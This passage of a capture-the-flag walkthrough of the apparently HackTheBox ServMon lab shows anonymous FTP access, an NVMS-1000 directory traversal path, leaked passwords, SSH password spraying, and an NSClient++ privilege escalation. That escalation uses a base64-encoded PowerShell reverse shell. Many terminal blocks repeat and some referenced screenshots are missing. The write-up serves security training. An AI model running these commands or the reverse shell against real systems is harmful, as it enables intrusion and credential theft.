Nmap done: 1 IP address (1 host up) scanned in 170.40 seconds

The FTP port allows anonymous access. Upon connecting, I find the Users directory which contains two more subdirectories Nadine and Nathan:

┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ ftp 10.129.227.77                                                                                                                              
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49677|)
150 Opening ASCII mode data connection.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.
ftp>
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ ftp 10.129.227.77                                                                                                                              
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.

ftp> dir
229 Entering Extended Passive Mode (|||49677|)
150 Opening ASCII mode data connection.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.
ftp>

Inside the Nadine directory, I found a file called Confidential.txt. Inside the Nathan directory, I found a file called Notes to do.txt:

ftp> dir
229 Entering Extended Passive Mode (|||49679|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt

After downloading the two files, the content of each files contains the following messages:

┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ cat Notes\ to\ do.txt   
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ cat Notes\ to\ do.txt   
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

The Confidential.txt file claims the user Nadine has left the Passwords.txt file of user Nathan at his Desktop. The other note also talks about the application NVMS.

Browsing to the web application on port returns the NVMS web application:

Trying default credentials does not result in anything. However, NVMS-1000 is vulnerable to directory traversal.

The PoC:

And after following the same steps from the PoC, I managed to read the win.ini:

Time to read the passwords.txt file found at the desktop of Nathan user. To read the file, I sent a request to the following URI:

/../../../../../../../Users/Nathan/Desktop/passwords.txt
/../../../../../../../Users/Nathan/Desktop/passwords.txt

And I get a hit:

The passwords are the following:

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

The passwords did not work for Nathan. However, I get a hit on Nadine on SSH:

┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ nxc ssh 10.129.227.77 -u Nadine -p passwords.txt --continue-on-success
SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ nxc ssh 10.129.227.77 -u Nadine -p passwords.txt --continue-on-success
SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!

Using the Nadine:L1k3B1gBut7s@W0rk credentials, I gained initial access to the machine via SSH:

The user.txt flag:

nadine@SERVMON C:\Users>cd Nadine

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>more user.txt
ffd1c2002c78d8615eb2c9fc79cb3bf7

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>

When enumerating the installed applications on the machine, I notice the NSClient++ which is active on port 8443 is there. I managed to grab the Administrator's password from the nsclient.ini file:

nadine@SERVMON C:\Program Files\NSClient++>more nsclient.ini
ï»¿# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

...SNIP....
nadine@SERVMON C:\Program Files\NSClient++>more nsclient.ini
ï»¿# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

...SNIP....

When Googling for any vulnerabilities, I came across this privilege escalation exploit. Also entering the administrator password does not allow me to access the GUI panel, as the allowed_hosts is only set to 127.0.0.1 which is the localhost.

Time to tunnel in. Since SSH is already open on the target machine, I performed a local port forwarding:

┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ ssh nadine@10.129.67.132 -L 8443:127.0.0.1:8443 -N
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nadine@10.129.67.132's password: 
┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ ssh nadine@10.129.67.132 -L 8443:127.0.0.1:8443 -N
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nadine@10.129.67.132's password:

Then I managed to access the GUI panel after logging in using the Administrator passwords inside nsclient.ini:

Start a listener on port 443. Then using this [exploit] to obtain a reverse shell connection. After some trial and error, I got the exploit to run:

┌──(kali㉿kali)-[~/Desktop/Labs/ServMon]
└─$ sudo python3 exp.py -t 127.0.0.1 -p ew2x6SsGTxjRwXOT -P 8444 -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
